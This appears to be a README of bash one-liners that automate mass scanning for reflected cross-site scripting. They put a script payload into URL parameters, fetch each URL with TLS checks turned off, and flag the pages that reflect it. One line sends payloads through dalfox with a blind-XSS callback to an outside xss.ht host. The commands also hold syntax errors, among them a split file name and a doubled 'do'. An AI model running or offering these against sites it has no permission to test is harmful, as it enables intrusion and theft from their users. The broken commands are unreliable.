# xss-automation-script

1. cat urls.txt | gf xss | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat combined fuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done


1. cat urls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done


1. cat php.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe -b https://rvsingh.xss.ht
